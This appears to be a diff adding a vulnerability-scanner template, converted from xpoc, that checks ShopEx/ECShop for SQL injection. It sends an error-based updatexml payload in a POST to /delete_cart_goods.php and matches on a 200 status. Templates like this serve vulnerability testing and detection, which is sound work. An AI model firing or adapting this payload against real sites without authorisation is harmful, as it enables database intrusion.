@@ -1,0 +1,20 @@
+id: yaml-poc-shopex-ecshop-sql_injection-CT-158128
+info:
+  name: Yaml Poc Shopex Ecshop Sql_Injection Ct 158128
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-shopex-ecshop-sql_injection-CT-158128'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /delete_cart_goods.php
+  body: id=0||(updatexml(1,concat(0x7e,(select%20md5({{r1}})),0x7e),1))
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
